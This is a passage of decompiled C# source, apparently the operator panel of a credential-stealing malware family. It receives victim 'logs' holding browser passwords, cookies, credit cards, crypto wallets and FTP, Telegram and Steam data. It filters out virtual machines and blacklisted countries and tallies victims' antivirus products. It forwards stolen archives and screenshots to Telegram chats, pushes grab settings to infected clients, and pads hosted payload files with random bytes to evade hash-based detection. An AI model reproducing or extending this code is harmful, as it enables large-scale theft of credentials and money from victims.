        if (!((string)exp).IsNull(string.Empty).Contains("/../"))
        {
            return ((string)exp).IsNull(string.Empty).Contains("\\..\\") ? 1u : 0u;
        }
        return 1u;
    }

    private void a(object c, uint value)
    {
        PropertyInfo property = typeof(Control).GetProperty("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty);
        if (property != null)
        {
            property.SetValue(c, (byte)value != 0, null);
            MethodInfo method = typeof(Control).GetMethod("SetStyle", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.InvokeMethod);
            if (method != null)
            {
                method.Invoke(c, new object[2]
                {
                    ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer,
                    true
                });
            }
            method = typeof(Control).GetMethod("UpdateStyles", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.InvokeMethod);
            if (method != null)
            {
                method.Invoke(c, null);
            }
        }
    }

    public void Login()
    {
        new SplashFrm().ShowDialog(this);
    }

    private void c(object listenerObj)
    {
        HttpListenerContext httpListenerContext = listenerObj as HttpListenerContext;
        try
        {
            HttpListenerRequest request = httpListenerContext.Request;
            if (request.QueryString.HasKey("id"))
            {
                string guestLinkId = request.QueryString.GetValue("id");
                GuestLink[] source = LazyLoader<GuestLinksDb>.Instance.DbInstance.ToArray();
                if (source.Any((GuestLink x) => x.ID == guestLinkId))
                {
                    GuestLink currentGuestLink = source.First((GuestLink x) => x.ID == guestLinkId);
                    bool flag = true;
                    if (string.IsNullOrWhiteSpace(currentGuestLink.ExpiresTime) || (!string.IsNullOrWhiteSpace(currentGuestLink.ExpiresTime) && DateTime.TryParseExact(currentGuestLink.ExpiresTime, "dd.MM.yyyy HH:mm", null, DateTimeStyles.None, out var result) && ((result >= DateTime.Now) ? true : false)))
                    {
                        lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
                        {
                            IEnumerable<UserLog> enumerable = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray()?.Where((UserLog x) => x.BuildID == currentGuestLink.BuildID);
                            if (enumerable != null && enumerable.Any())
                            {
                                IOrderedEnumerable<KeyValuePair<string, long>> keyValuePairs = from x in enumerable.CountBy((UserLog x) => x.Country)
                                                                                               orderby x.Value descending
                                                                                               select x;
                                string s = GenerateHtml(keyValuePairs, enumerable.Count());
                                byte[] bytes = Encoding.UTF8.GetBytes(s);
                                httpListenerContext.Response.OutputStream.Write(bytes, 0, bytes.Length);
                            }
                        }
                    }
                }
            }
            else
            {
                string fileName = request.RawUrl.TrimStart('/');
                if (fileName.Contains(".."))
                {
                    return;
                }
                GuestFile[] source2 = LazyLoader<GuestFilesDb>.Instance.DbInstance.ToArray();
                if (source2.Any((GuestFile x) => x.Filename == fileName))
                {
                    source2.First((GuestFile x) => x.Filename == fileName);
                    string path = Path.Combine(new DirectoryInfo(Path.Combine(Directory.GetCurrentDirectory(), "GuestFilesHost")).FullName, fileName);
                    List<byte> list = new List<byte>();
                    lock (LazyLoader<GuestFilesDb>.Instance.DataBaseLock)
                    {
                        list = System.IO.File.ReadAllBytes(path).ToList();
                        if (source2.FirstOrDefault((GuestFile x) => x.Filename == fileName).ChangeMd5)
                        {
                            int num = new Random().Next(1, 10000);
                            for (int i = 0; i < num; i++)
                            {
                                list.Add(0);
                            }
                        }
                    }
                    httpListenerContext.Response.OutputStream.Write(list.ToArray(), 0, list.Count);
                }
            }
            httpListenerContext.Response.Close();
        }
        catch
        {
        }
    }

    public string GenerateHtml(IOrderedEnumerable<KeyValuePair<string, long>> keyValuePairs, int total)
    {
        string result = string.Empty;
        try
        {
            result = string.Format("\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n    <head>\r\n        <meta charset=\"UTF-8\" />\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\r\n        <title>Meta Guest Stat</title>\r\n\r\n        <style>\r\n            * {{\r\n                margin: 0;\r\n            }}\r\n            .MainSection {{\r\n                width: 99%;\r\n                height: auto;\r\n                font-size: 12px;\r\n            }}\r\n\r\n            .MainSection > h2 {{\r\n                width: 100%;\r\n                font-size: 18px !important;\r\n                font-weight: 500;\r\n                color: #fff;\r\n                padding: 12px;\r\n                background: #fff;\r\n            }}\r\n            .MainSection > h2:hover {{\r\n                cursor: default;\r\n            }}\r\n\r\n            .MainSectionContent {{\r\n                width: 100%;\r\n                height: auto;\r\n                margin-top: 10px;\r\n            }}\r\n            .Tables {{\r\n                display: flex;\r\n                justify-content: space-around;\r\n            }}\r\n            .Tables > .Columns {{\r\n                width: 49.9%;\r\n                height: auto;\r\n                min-height: 30px;\r\n                position: relative;\r\n                text-align: center !important;\r\n            }}\r\n\r\n            .Columns > p:first-child {{\r\n                height: 40px;\r\n                line-height: 40px;\r\n                font-weight: bold;\r\n                color: rgb(97, 97, 97);\r\n                border: none;\r\n                border-top: 1px solid rgb(224, 224, 224);\r\n                border-bottom: 1px solid rgb(224, 224, 224);\r\n                background: rgb(228, 228, 228);\r\n            }}\r\n            .Columns > p {{\r\n                height: 40px;\r\n                line-height: 40px;\r\n                font-size: 16px;\r\n                margin-top: 5px;\r\n                color: #000;\r\n                border-bottom: 1px solid rgb(224, 224, 224);\r\n            }}\r\n            .secondChild {{\r\n                border: none;\r\n                background: rgb(245, 245, 245);\r\n            }}\r\n            .Columns > p:last-child {{\r\n                font-size: 14px;\r\n                border: none;\r\n            }}\r\n            .dark > h2 {{\r\n                background: rgb(43, 54, 60) !important;\r\n            }}\r\n            #FirstTable,\r\n            #SecondTable {{\r\n                width: 600px;\r\n                min-height: 50px;\r\n                margin: 0 10px;\r\n                display: inline-block;\r\n            }}\r\n        </style>\r\n    </head>\r\n    <body>\r\n        <div class=\"MainSection dark\">\r\n            <h2>Total of installs: {0}</h2>\r\n\r\n            <div id=\"FirstTable\">\r\n                <div class=\"MainSectionContent\">\r\n                    <div class=\"Tables\">\r\n                        <div class=\"Columns\">\r\n                            <p>County</p>\r\n                            {1}\r\n                        </div>\r\n                        <div class=\"Columns\">\r\n                            <p>Count</p>\r\n                            {2}\r\n                        </div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n\r\n        \r\n    </body>\r\n</html>\r\n\r\n\r\n", total, string.Join(Environment.NewLine, keyValuePairs.Select((KeyValuePair<string, long> x) => "<p>" + x.Key + "</p>")), string.Join(Environment.NewLine, keyValuePairs.Select((KeyValuePair<string, long> x) => $"<p>{x.Value}</p>")));
        }
        catch
        {
        }
        return result;
    }

    public bool IsBlacklisted(UserLog user)
    {
        try
        {
            if (user.Credentials?.Hardwares != null && user.Credentials.Hardwares.Any((Hardware x) => x.Caption.Contains("VMware")))
            {
                return true;
            }
            if (RemoteClientSettings.BlacklistedCountry.Contains(user.Country))
            {
                AddNotify("Blocked log " + user.HWID + "|" + user.IP + " by country " + user.Country);
                return true;
            }
            if (RemoteClientSettings.BlacklistedHWID.Contains(user.HWID))
            {
                AddNotify("Blocked log " + user.HWID + "|" + user.IP + " by hwid " + user.HWID);
                return true;
            }
            if (!RemoteClientSettings.BlackListedIPS.Contains(user.IP))
            {
                if (string.IsNullOrWhiteSpace(user.BuildID) || !RemoteClientSettings.BlackListedBuilds.Contains(user.BuildID))
                {
                    return string.IsNullOrWhiteSpace(user.Country) || string.IsNullOrWhiteSpace(user.HWID) || string.IsNullOrWhiteSpace(user.IP);
                }
                AddNotify("Blocked log " + user.HWID + "|" + user.IP + " by buildId " + user.BuildID);
                return true;
            }
            AddNotify("Blocked log " + user.HWID + " by ip " + user.IP);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public Task ReciveClient(UserLog user)
    {
        return Task.Factory.StartNew(delegate
        {
            try
            {
                try
                {
                    if (IsBlacklisted(user))
                    {
                        user = default(UserLog);
                        return;
                    }
                }
                catch
                {
                }
                bool flag = false;
                user.LogDate = DateTime.Now;
                bool flag2 = false;
                flag2 = RemoteClientSettings.AntiDuplicate;
                if (method_1(user) != 0)
                {
                    user = default(UserLog);
                    return;
                }
                lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
                {
                    if (!(flag = LazyLoader<UserLogsDb>.Instance.DbInstance.Any((UserLog x) => x.HWID == user.HWID) && flag2))
                    {
                        if (LazyLoader<UserLogsDb>.Instance.DbInstance.Count != 0)
                        {
                            user.ID = LazyLoader<UserLogsDb>.Instance.DbInstance[LazyLoader<UserLogsDb>.Instance.DbInstance.Count - 1].ID + 1;
                        }
                        else
                        {
                            user.ID = 1;
                        }
                    }
                    List<string> list = new List<string>();
                    lock (settingsLock)
                    {
                        list = ((RemoteClientSettings.DDPatterns == null) ? new List<string>() : RemoteClientSettings.DDPatterns.Cast<string>().ToList());
                    }
                    user.Checked = false;
                    if (!flag)
                    {
                        int num = 0;
                        int num2 = 0;
                        int num3 = 0;
                        int num4 = 0;
                        try
                        {
                            IList<Browser> browsers = user.Credentials.Browsers;
                            if (browsers != null && browsers.Count > 0)
                            {
                                num = browsers.Where((Browser q) => q.Credentials != null).SelectMany((Browser x) => x.Credentials)?.Count() ?? 0;
                                num2 = browsers.Where((Browser q) => q.Cookies != null).SelectMany((Browser x) => x.Cookies)?.Count() ?? 0;
                                num3 = browsers.Where((Browser q) => q.CreditCards != null).SelectMany((Browser x) => x.CreditCards)?.Count() ?? 0;
                            }
                            IList<RemoteFile> coldWallets = user.Credentials.ColdWallets;
                            if (coldWallets != null && coldWallets.Count > 0)
                            {
                                num4 = user.Credentials.ColdWallets.CountBy((RemoteFile x) => x.NameOfApplication).Keys.Count;
                            }
                        }
                        catch
                        {
                        }
                        user.Creds = $"{num}|{num2}|{num3}|{num4}";
                        if (!(user.Creds == "0|3|0|7") && !(user.Creds == "2|0|0|7") && !(user.Creds == "0|35|0|7") && !(user.Creds == "0|0|0|1") && !(user.Creds == "0|55|0|7") && !(user.Creds == "3|55|0|7") && !(user.Creds == "0|37|0|7") && !(user.Creds == "0|3|0|0") && (!RemoteClientSettings.BlockEmptyLogs || !(user.Creds == "0|0|0|0")))
                        {
                            try
                            {
                                user.PDD = string.Empty;
                                user.CDD = string.Empty;
                                foreach (string item in list)
                                {
                                    try
                                    {
                                        string[] array = item.Split('=');
                                        if (user.PasswordContains(array[1]))
                                        {
                                            ref UserLog reference = ref user;
                                            reference.PDD = reference.PDD + array[0] + "|";
                                        }
                                        if (user.CookiesContains(array[1]))
                                        {
                                            ref UserLog reference2 = ref user;
                                            reference2.CDD = reference2.CDD + array[0] + "|";
                                        }
                                    }
                                    catch
                                    {
                                    }
                                }
                                user.PDD = user.PDD.TrimEnd('|');
                                user.CDD = user.CDD.TrimEnd('|');
                            }
                            catch
                            {
                            }
                            string autosaveDirectory = RemoteClientSettings.AutosaveDirectory;
                            if (!string.IsNullOrWhiteSpace(autosaveDirectory))
                            {
                                try
                                {
                                    if (!Directory.Exists(autosaveDirectory))
                                    {
                                        Directory.CreateDirectory(autosaveDirectory);
                                    }
                                    user.SaveTo(new HeaderParams(ProfileSettings.HeaderActivated, SettingsOfPanel.Default.LogHeader), autosaveDirectory, list);
                                    user.Checked = true;
                                }
                                catch
                                {
                                }
                            }
                            if (object_4 != null)
                            {
                                user.Checked = true;
                                ProcessTelegram(user, list);
                            }
                            LazyLoader<UserLogsDb>.Instance.Save(user);
                            CalcCounters(user, user.Creds);
                            user.Credentials = new Credentials();
                            user.Screenshot = new byte[0];
                            LazyLoader<UserLogsDb>.Instance.DbInstance.Add(user);
                            lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    LazyLoader<UserLogsDb>.Instance.PageController.AddToEnd(user);
                                });
                            }
                            LazyLoader<UserLogsDb>.Instance.PageController.ChangeCount(LazyLoader<UserLogsDb>.Instance.DbInstance.Count);
                            user = default(UserLog);
                        }
                        else
                        {
                            AddNotify("Blocked log " + user.HWID + " by creds " + user.Creds);
                            user = default(UserLog);
                        }
                    }
                    else
                    {
                        AddNotify("Duplicate log from " + user.HWID + "|" + user.IP + "|BuildID=" + user.BuildID.IsNull("UNKNOWN"));
                        user = default(UserLog);
                    }
                }
            }
            catch (Exception ex)
            {
                AddNotify(ex.ToString());
                user = default(UserLog);
            }
        });
    }

    public async void ProcessTelegram(UserLog user, List<string> dds)
    {
        Task.Factory.StartNew(delegate
        {
            try
            {
                List<TelegramChatSettings> list = new List<TelegramChatSettings>();
                lock (((TelegramChatsDb)e).RootLocker)
                {
                    list = ((TelegramChatsDb)e).chatsSettings;
                }
                if (object_4 != null)
                {
                    foreach (TelegramChatSettings item in list)
                    {
                        try
                        {
                            if (user.IsMatch(item.SearchParams))
                            {
                                string text = user.Country + "[" + user.HWID + "] [" + user.LogDate.ToString("O").Replace(':', '_') + "]";
                                string text2 = Path.Combine(Directory.GetCurrentDirectory(), "TelegramLogs");
                                InputOnlineFile inputOnlineFile = null;
                                if (item.SendingMode != 0)
                                {
                                    if (item.SendingMode == SendingMode.SendScreenshot)
                                    {
                                        byte[] screenshot = user.Screenshot;
                                        if (screenshot != null && screenshot.Any())
                                        {
                                            inputOnlineFile = new InputOnlineFile(new MemoryStream(user.Screenshot), "Screenshot.jpg");
                                        }
                                    }
                                }
                                else
                                {
                                    user.SaveTo(new HeaderParams(ProfileSettings.HeaderActivated, SettingsOfPanel.Default.LogHeader), text2, dds);
                                    ZipFile.CreateFromDirectory(Path.Combine(text2, text), text + ".zip");
                                    Directory.Delete(Path.Combine(text2, text), recursive: true);
                                    inputOnlineFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes(text + ".zip")), text + ".zip");
                                }
                                lock (d)
                                {
                                    string caption = item.MessageFormat.Replace("{ID}", user.ID.ToString()).Replace("{BuildID}", user.BuildID).Replace("{CDD}", user.CDD)
                                        .Replace("{PDD}", user.PDD)
                                        .Replace("{Comment}", user.Comment)
                                        .Replace("{Country}", user.Country)
                                        .Replace("{Creds}", user.Creds)
                                        .Replace("{HWID}", user.HWID)
                                        .Replace("{IP}", user.IP)
                                        .Replace("{Location}", user.Location)
                                        .Replace("{LogDate}", user.LogDate.ToString())
                                        .Replace("{OS}", user.OS)
                                        .Replace("{PostalCode}", user.PostalCode)
                                        .Replace("{TimeZone}", user.TimeZone)
                                        .Replace("{Username}", user.Username)
                                        .Replace("{FileLocation}", user.FileLocation)
                                        .Replace("{SeenBefore}", user.SeenBefore.ToString());
                                    if (item.SendingMode == SendingMode.SendLog)
                                    {
                                        ((TelegramBotClient)object_4).SendDocumentAsync((ChatId)item.ChatId, inputOnlineFile, caption, ParseMode.Html, (MessageEntity[])null, disableContentTypeDetection: false, disableNotification: false, 0, allowSendingWithoutReply: false, (IReplyMarkup)null, default(CancellationToken), (InputMedia)null).Wait();
                                        user.Checked = true;
                                        System.IO.File.Delete(text + ".zip");
                                    }
                                    else if (item.SendingMode == SendingMode.SendScreenshot && user.Screenshot.IsNull(new byte[0]).Length != 0)
                                    {
                                        ((TelegramBotClient)object_4).SendPhotoAsync((ChatId)item.ChatId, inputOnlineFile, caption, ParseMode.Html, (MessageEntity[])null, disableNotification: false, 0, allowSendingWithoutReply: false, (IReplyMarkup)null, default(CancellationToken)).Wait();
                                    }
                                    else
                                    {
                                        ((TelegramBotClient)object_4).SafeSendTextMessage((ChatId)item.ChatId, caption, ParseMode.Html, (MessageEntity[])null, disableWebPagePreview: false, disableNotification: false, 0, allowSendingWithoutReply: false, (IReplyMarkup)null, default(CancellationToken)).Wait();
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            AddNotify("Telegram error: " + ex);
                        }
                    }
                }
            }
            catch (Exception ex2)
            {
                AddNotify("Telegram error: " + ex2);
            }
            user = default(UserLog);
        });
    }

    public Task<ClientSettings> OnGetSettings()
    {
        return Task.Factory.StartNew(delegate
        {
            ClientSettings clientSettings = new ClientSettings();
            try
            {
                lock (settingsLock)
                {
                    try
                    {
                        clientSettings.SystemVarsNames = new List<string>();
                        clientSettings.SystemVarsNames.AddRange(System.IO.File.ReadAllLines("systemVars.txt"));
                    }
                    catch
                    {
                    }
                    try
                    {
                        clientSettings.ScanChromeBrowsersPaths = new List<string>();
                        clientSettings.ScanChromeBrowsersPaths.AddRange(System.IO.File.ReadAllLines("chromeBrowsers.txt"));
                    }
                    catch
                    {
                    }
                    try
                    {
                        clientSettings.ScanGeckoBrowsersPaths = new List<string>();
                        clientSettings.ScanGeckoBrowsersPaths.AddRange(System.IO.File.ReadAllLines("geckoBrowsers.txt"));
                    }
                    catch
                    {
                    }
                    clientSettings.GrabPaths = ((RemoteClientSettings.GrabPaths == null) ? new List<string>() : RemoteClientSettings.GrabPaths.Cast<string>().ToList());
                    clientSettings.ExtensionPaths = string.Join(Environment.NewLine, (RemoteClientSettings.BrowserExtensions == null) ? new List<string>() : RemoteClientSettings.BrowserExtensions);
                    clientSettings.GrabDiscord = RemoteClientSettings.GrabDiscord;
                    clientSettings.GrabBrowsers = RemoteClientSettings.GrabBrowsers;
                    clientSettings.GrabFiles = RemoteClientSettings.GrabFiles;
                    clientSettings.GrabFTP = RemoteClientSettings.GrabFTP;
                    clientSettings.GrabWallets = RemoteClientSettings.GrabWallets;
                    clientSettings.GrabTelegram = RemoteClientSettings.GrabTelegram;
                    clientSettings.GrabVPN = RemoteClientSettings.GrabVPN;
                    clientSettings.GrabScreenshot = RemoteClientSettings.GrabScreenshot;
                    clientSettings.GrabSteam = RemoteClientSettings.GrabSteam;
                }
                lock (WalletConfigsDb.RootLocker)
                {
                    WalletConfigsDb walletConfigsDb = new WalletConfigsDb();
                    walletConfigsDb.LoadSettings();
                    if (walletConfigsDb.walletSettings.Count == 0)
                    {
                        walletConfigsDb.SetDefault();
                        walletConfigsDb.SaveSettings();
                    }
                    clientSettings.Configs = walletConfigsDb.walletSettings;
                }
            }
            catch (Exception)
            {
            }
            return clientSettings;
        });
    }

    private void closeBtn_Click(object sender, object e)
    {
        if (MessageBox.Show(this, "Are you sure you want to close panel?", "Verification", MessageBoxButtons.OKCancel) != DialogResult.OK)
        {
            return;
        }
        try
        {
            foreach (Process item in from x in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName)
                                     where x.Id != Process.GetCurrentProcess().Id
                                     select x)
            {
                item.Kill();
                item.WaitForExit();
            }
            Process.GetCurrentProcess().Kill();
        }
        catch
        {
        }
    }

    public void CalcCounters(UserLog user, string creds)
    {
        try
        {
            lock (this.m_a)
            {
                if (!string.IsNullOrWhiteSpace(user.Country))
                {
                    ((StatisticDb)object_8).Country.Add(user.Country);
                }
                if (!string.IsNullOrWhiteSpace(user.OS))
                {
                    ((StatisticDb)object_8).OS.Add(user.OS);
                }
                IList<string> defenders = user.Credentials.Defenders;
                if (defenders != null)
                {
                    if (defenders.Count == 1)
                    {
                        ((StatisticDb)object_8).AVs.Add(defenders[0]);
                    }
                    else
                    {
                        foreach (string item in defenders)
                        {
                            if (!item.Contains("Windows Defender"))
                            {
                                ((StatisticDb)object_8).AVs.Add(item);
                            }
                        }
                    }
                    if (defenders.Count == 0)
                    {
                        ((StatisticDb)object_8).AVs.Add("NO ANTIVURUS");
                    }
                }
                int[] array = (from x in creds.Split('|')
                               select int.Parse(x)).ToArray();
                IList<Browser> browsers = user.Credentials.Browsers;
                if (browsers != null && browsers.Count > 0)
                {
                    IEnumerable<Autofill> enumerable = browsers.Where((Browser x) => x.Autofills != null).SelectMany((Browser x) => x.Autofills);
                    ((StatisticDb)object_8).Passwords += array[0];
                    ((StatisticDb)object_8).Cookies += array[1];
                    ((StatisticDb)object_8).CreditCards += array[2];
                    ((StatisticDb)object_8).AutoFills += enumerable?.Count() ?? 0;
                }
                IList<LoginPair> ftpConnections = user.Credentials.FtpConnections;
                if (ftpConnections != null && ftpConnections.Count > 0)
                {
                    ((StatisticDb)object_8).FTPs += user.Credentials.FtpConnections?.Count ?? 0;
                }
                IList<RemoteFile> files = user.Credentials.Files;
                if (files != null && files.Count > 0)
                {
                    ((StatisticDb)object_8).Files += user.Credentials.Files?.Count ?? 0;
                }
                ((StatisticDb)object_8).ColdWallets += array[3];
                UpdateStat();
                user.Credentials = new Credentials();
            }
        }
        catch (Exception ex)
        {
            AddNotify("Update stat ex: " + ex);
        }
    }

    public void UpdateStat()
    {
        try
        {
            BindingList<string> AvList = new BindingList<string>();
            AvList.Add(string.Empty);
            try
            {
                Dictionary<string, long> dictionary = ((StatisticDb)object_8).AVs.Cast<string>().CountBy((string x) => x);
                if (dictionary.Count > 0)
                {
                    AvList.Add(from item in (from x in dictionary
                                             orderby x.Value descending
                                             where !string.IsNullOrWhiteSpace(x.Key)
                                             select x).Take(10)
                               select $"{item.Key}   -   {item.Value}");
                }
            }
            catch
            {
            }
            BindingList<string> OsList = new BindingList<string>();
            OsList.Add(string.Empty);
            try
            {
                Dictionary<string, long> dictionary2 = ((StatisticDb)object_8).OS.Cast<string>().CountBy((string x) => x);
                if (dictionary2.Count > 0)
                {
                    OsList.Add(from item in (from x in dictionary2
                                             orderby x.Value descending
                                             where !string.IsNullOrWhiteSpace(x.Key)
                                             select x).Take(10)
                               select $"{item.Key}   -   {item.Value}");
                }
            }
            catch
            {
            }
            BindingList<string> CountryList = new BindingList<string>();
            CountryList.Add(string.Empty);
            try
            {
                Dictionary<string, long> dictionary3 = ((StatisticDb)object_8).Country.Cast<string>().CountBy((string x) => x);
                if (dictionary3.Count > 0)
                {
                    CountryList.Add(from item in (from x in dictionary3
                                                  orderby x.Value descending
                                                  where !string.IsNullOrWhiteSpace(x.Key)
                                                  select x).Take(10)
                                    select $"{item.Key}   -   {item.Value}");
                }
            }
            catch
            {
            }
            Invoke((MethodInvoker)delegate
            {
                ((Control)passwordsCounter).Text = ((StatisticDb)object_8).Passwords.ToString();
                ((Control)cookiesCounter).Text = ((StatisticDb)object_8).Cookies.ToString();
                ((Control)autofillsCounter).Text = ((StatisticDb)object_8).AutoFills.ToString();
                ((Control)creditcardsCounter).Text = ((StatisticDb)object_8).CreditCards.ToString();
                ((Control)filesCounter).Text = ((StatisticDb)object_8).Files.ToString();
                ((Control)ftpsCounter).Text = ((StatisticDb)object_8).FTPs.ToString();
                ((Control)coldWalletCounter).Text = ((StatisticDb)object_8).ColdWallets.ToString();
                ((ListControl)top10osLb).DataSource = OsList;
                ((ListControl)top10CountriesLb).DataSource = CountryList;
                ((ListControl)e2).DataSource = AvList;
            });
        }
        catch (Exception ex)
        {
            AddNotify("UpdateStat Ex: " + ex);
        }
    }

    public void LoadSettings()
    {
        Invoke((MethodInvoker)delegate
        {
            ((MetroSetCheckBox)discordCb).Checked = RemoteClientSettings.GrabDiscord;
            ((MetroSetCheckBox)grabColdWalletCb).Checked = RemoteClientSettings.GrabWallets;
            ((MetroSetCheckBox)grabBrowsersCb).Checked = RemoteClientSettings.GrabBrowsers;
            ((MetroSetCheckBox)grabFilesCb).Checked = RemoteClientSettings.GrabFiles;
            ((MetroSetCheckBox)grabFtpsCb).Checked = RemoteClientSettings.GrabFTP;
            ((MetroSetCheckBox)grabImClientsCb).Checked = RemoteClientSettings.GrabImClients;
            ((MetroSetCheckBox)duplicateCb).Checked = RemoteClientSettings.AntiDuplicate;
            ((MetroSetCheckBox)blockEmptyLogsCb).Checked = RemoteClientSettings.BlockEmptyLogs;
            ((MetroSetCheckBox)this.m_a6).Checked = RemoteClientSettings.SaveAsJSON;
            ((MetroSetCheckBox)cc).Checked = RemoteClientSettings.GrabVPN;
            ((MetroSetCheckBox)cf).Checked = RemoteClientSettings.GrabScreenshot;
            ((MetroSetCheckBox)d1).Checked = RemoteClientSettings.GrabTelegram;
            ((MetroSetCheckBox)ca).Checked = RemoteClientSettings.GrabSteam;
            ((AnimaTextBox)e6).Text = RemoteClientSettings.AutosaveDirectory;
            ((AnimaTextBox)this.m_b6).Text = RemoteClientSettings.TelegramBotToken;
            ((MetroSetCheckBox)autoStartTelegramCb).Checked = RemoteClientSettings.AutoStart;
            ((AnimaTextBox)logsHeaderTb).Text = SettingsOfPanel.Default.LogHeader;
            ((MetroSetCheckBox)autoRefreshCb).Checked = RemoteClientSettings.AutoRefreshCookies;
            ((MetroSetCheckBox)autoUpdatePanelCb).Checked = RemoteClientSettings.AutoUpdate;
            ((ListBox)cd).Items.Clear();
            ((ListBox)blackListBuildsLb).Items.Clear();
            ((ListBox)fe).Items.Clear();
            ((ListBox)blackListIPsLb).Items.Clear();
            ((ListBox)blackListLb).Items.Clear();
            ((ListBox)getFilesSettingsLb).Items.Clear();
            ((ListBox)browsersExtensionsListBox).Items.Clear();
            foreach (string dDPattern in RemoteClientSettings.DDPatterns)
            {
                ((ListBox)cd).Items.Add(dDPattern);
            }
            foreach (string blackListedBuild in RemoteClientSettings.BlackListedBuilds)
            {
                ((ListBox)blackListBuildsLb).Items.Add(blackListedBuild);
            }
            foreach (string item in RemoteClientSettings.BlacklistedHWID)
            {
                ((ListBox)fe).Items.Add(item);
            }
            foreach (string blackListedIP in RemoteClientSettings.BlackListedIPS)
            {
                ((ListBox)blackListIPsLb).Items.Add(blackListedIP);
            }
            foreach (string item2 in RemoteClientSettings.BlacklistedCountry)
            {
                ((ListBox)blackListLb).Items.Add(item2);
            }
            foreach (string grabPath in RemoteClientSettings.GrabPaths)
            {
                ((ListBox)getFilesSettingsLb).Items.Add(grabPath);
            }
            foreach (string browserExtension in RemoteClientSettings.BrowserExtensions)
            {
                ((ListBox)browsersExtensionsListBox).Items.Add(browserExtension);
            }
            if (System.IO.File.Exists("sorterState.json"))
            {
                try
                {
                    SingleSearchParams singleSearchParams = System.IO.File.ReadAllText("sorterState.json").FromJSON<SingleSearchParams>();
                    ((AnimaTextBox)this.m_a9).Text = singleSearchParams.SetComment;
                    ((AnimaTextBox)this.m_a7).Text = singleSearchParams.SkipComment;
                    ((AnimaTextBox)singleIdSortTb).Text = singleSearchParams.BuildID;
                    ((AnimaTextBox)singleCommentSortTb).Text = singleSearchParams.Comment;
                    ((AnimaTextBox)singleOsSortTb).Text = singleSearchParams.OS;
                    ((AnimaTextBox)singleCountrySortTb).Text = singleSearchParams.Country;
                    ((MetroSetCheckBox)singleAfSortCb).Checked = singleSearchParams.ContainsAFs;
                    ((MetroSetCheckBox)singleCCsSortCb).Checked = singleSearchParams.ContainsCCs;
                    ((MetroSetCheckBox)singleFilesSortCb).Checked = singleSearchParams.ContainsFiles;
                    ((MetroSetCheckBox)singleFtpsSortCb).Checked = singleSearchParams.ContainsFTPs;
                    ((AnimaTextBox)singleCookieSortTb).Text = singleSearchParams.CookieDomain;
                    ((AnimaTextBox)singlePasswordSortTb).Text = singleSearchParams.PasswordDomain;
                    ((MetroSetCheckBox)singleColdWalletSortCb).Checked = singleSearchParams.ContainsWallets;
                    ((MetroSetCheckBox)ba).Checked = singleSearchParams.SkipCookies;
                    ((MetroSetCheckBox)b8).Checked = singleSearchParams.SkipPasswords;
                    ((MetroSetCheckBox)ea).Checked = singleSearchParams.RefreshDD;
                    ((MetroSetCheckBox)be).Checked = singleSearchParams.SkipChecked;
                    ((AnimaTextBox)ef).Text = singleSearchParams.FilesToSearch;
                    ((MetroSetCheckBox)f1).Checked = singleSearchParams.ContainsSteam;
                    ((MetroSetCheckBox)f3).Checked = singleSearchParams.ContainsTelegram;
                    ((NumericUpDown)passMoreThan).Value = singleSearchParams.PasswordsMoreThan;
                    ((NumericUpDown)cookiesMoreThan).Value = singleSearchParams.CookiesMoreThan;
                    ((DateTimePicker)d5).Value = singleSearchParams.LogFrom;
                    ((DateTimePicker)d6).Value = singleSearchParams.LogTo;
                }
                catch
                {
                }
            }
        });
    }

    public void ProcessNotifies()
    {
        lock (object_7)
        {
            while (((Queue<string>)f).Count != 0)
            {
                if (((TextBoxBase)notificationTb).Lines.Length > 500)
                {
                    ((Control)notificationTb).ResetText();
                }
                ((TextBoxBase)notificationTb).AppendText(((Queue<string>)f).Dequeue());
            }
        }
    }

    public void AddNotify(string message)
    {
        lock (object_7)
        {
            ((Queue<string>)f).Enqueue(DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | " + message + Environment.NewLine);
        }
    }

    private async void clearBtn_Click(object sender, object e)
    {
        if (MessageBox.Show("Are you sure you want to delete all your logs?", "Verification", MessageBoxButtons.OKCancel) != DialogResult.OK)
        {
            return;
        }
        ((DataGridView)logsListView).DataSource = null;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
                {
                    lock (this.m_a)
                    {
                        ((StatisticDb)object_8).SetDefault();
                        ((StatisticDb)object_8).SaveSettings();
                    }
                    UpdateStat();
                    Invoke((MethodInvoker)delegate
                    {
                        LazyLoader<UserLogsDb>.Instance.ClearDb();
                    });
                    LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
                }
                AddNotify("A List of logs cleared");
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private void logContextMenu_Opening(object sender, object e)
    {
        if (((DataGridView)logsListView).SelectedRows.Count > 1)
        {
            ((ToolStripItem)systemInfoToolStripMenuItem).Visible = false;
            ((ToolStripItem)viewersToolStripMenuItem).Visible = false;
            ((ToolStripItem)runtimeExceptionToolStripMenuItem).Visible = false;
            ((ToolStripItem)ec).Visible = false;
        }
        if (((DataGridView)logsListView).SelectedRows.Count == 1)
        {
            ((ToolStripItem)systemInfoToolStripMenuItem).Visible = true;
            ((ToolStripItem)viewersToolStripMenuItem).Visible = true;
            ((ToolStripItem)runtimeExceptionToolStripMenuItem).Visible = true;
            ((ToolStripItem)ec).Visible = true;
        }
        ((CancelEventArgs)e).Cancel = ((DataGridView)logsListView).SelectedRows.Count == 0;
    }

    private async void passwordsToolStripMenuItem_Click(object sender, object e)
    {
